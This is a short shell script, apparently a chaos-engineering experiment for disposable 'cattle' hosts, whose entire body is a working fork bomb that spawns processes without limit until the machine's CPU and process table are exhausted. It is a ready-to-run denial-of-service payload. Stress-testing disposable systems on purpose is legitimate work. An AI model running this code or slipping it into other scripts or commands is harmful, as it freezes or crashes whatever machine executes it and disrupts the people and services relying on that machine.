#!/bin/sh
# Description: Fork Bomb experiment to consume CPU
# Dependencies:
# Cattle: true
bomb() { bomb | bomb & }; bomb;